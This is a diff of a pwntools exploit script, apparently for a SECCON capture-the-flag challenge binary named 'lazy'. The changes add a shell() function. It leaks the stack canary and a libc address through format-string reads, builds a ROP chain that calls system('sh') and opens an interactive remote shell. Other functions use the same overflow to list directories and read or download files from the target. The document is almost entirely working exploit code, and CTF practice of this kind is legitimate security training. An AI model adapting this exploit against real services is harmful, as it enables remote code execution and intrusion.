@@ -1,13 +1,20 @@
 #!/usr/bin/env python3
 
 from pwn import *
+
 context(arch="amd64", terminal=["tmux", "neww"])
-#r = process("./lazy", env={"HOME":"/mnt/lazy"})
+
 b = ELF("./lazy")
 rop = ROP(b)
 buf = 0x602530
 
-def login_get_canary(r):
+def create_tube():
+    #r = process("./lazy", env={"HOME":"/mnt"})
+    r = remote("lazy.chal.seccon.jp", 33333)
+    return r
+
+def login_get_canary():
+    r = create_tube()
     r.sendline(str(2))
     r.sendline("_H4CK3R_")
     r.sendline("3XPL01717")
@@ -15,11 +22,10 @@ def login_get_canary(r):
     r.sendline(str(4))
     r.sendline("%9$llx")
     r.recvuntil("Filename : ")
-    return int(r.recvline().strip(), 16)
+    return r, int(r.recvline().strip(), 16)
 
-def download(path, fname):
-    r = remote("lazy.chal.seccon.jp", 33333)
-    canary = login_get_canary(r)
+def download(path, savename):
+    r, canary = login_get_canary()
 
     r.sendline(str(4))
     payload = b"file".ljust(0x18, b'\x00')
@@ -37,14 +43,13 @@ def download(path, fname):
     size = int(r.recvuntil(' bytes', drop=True))
     print("Size :", size)
     data = r.recvall()
-    with open(fname, 'wb') as f:
+    with open(savename, 'wb') as f:
         f.write(data)
-        print('write', len(data), 'bytes to', fname, '.')
+        print('wrote', len(data), 'bytes to', savename, '.')
 
 def list_dir(path):
     print(path, ':')
-    r = remote("lazy.chal.seccon.jp", 33333)
-    canary = login_get_canary(r)
+    r, canary = login_get_canary()
 
     r.sendline(str(4))
     payload = b"file".ljust(0x18, b'\x00')
@@ -67,8 +72,7 @@ def list_dir(path):
 
 def readfile(path):
     print('read', path, ':')
-    r = remote("lazy.chal.seccon.jp", 33333)
-    canary = login_get_canary(r)
+    r, canary = login_get_canary()
 
     r.sendline(str(4))
     payload = b"file".ljust(0x18, b'\x00')
@@ -96,7 +100,32 @@ def readfile(path):
     r.recvuntil('file!')
     print(r.recvall().decode())
 
+def shell():
+    r, canary = login_get_canary()
+
+    r.sendline(str(4))
+    r.sendline("%21$llx")
+    r.recvuntil("Filename : ")
+    __libc_start_main = int(r.recvline().strip(), 16)
+    system = __libc_start_main - 0x20730 + 0x3f570
+
+    r.sendline(str(4))
+    payload = b"file".ljust(0x18, b'\x00')
+    payload += flat([
+        canary, 0,
+        rop.rdi.address, buf,
+        b.symbols['input'],
+
+        rop.rdi.address, buf,
+        system
+    ])
+    r.sendline(payload)
+    r.sendline('sh')
+    r.interactive()
+
+
 context.log_level = 'error'
-list_dir('.')
-list_dir('../shimizu')
-readfile('/proc/self/maps')
+#list_dir('q')
+#readfile('/proc/self/maps')
+#download('libc.so.6', 'libc.so.6')
+shell()
